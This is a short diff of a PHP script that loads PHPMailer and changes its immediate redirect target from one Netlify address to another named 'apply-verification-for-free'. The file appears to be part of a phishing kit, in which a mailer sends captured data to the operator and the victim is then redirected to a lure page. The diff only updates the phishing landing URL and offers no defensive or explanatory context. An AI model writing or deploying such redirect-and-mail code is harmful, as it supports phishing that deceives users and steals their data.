@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://dapper-biscuit-956f1c-click-req.netlify.app/");
+header("Location:  https://apply-verification-for-free.netlify.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
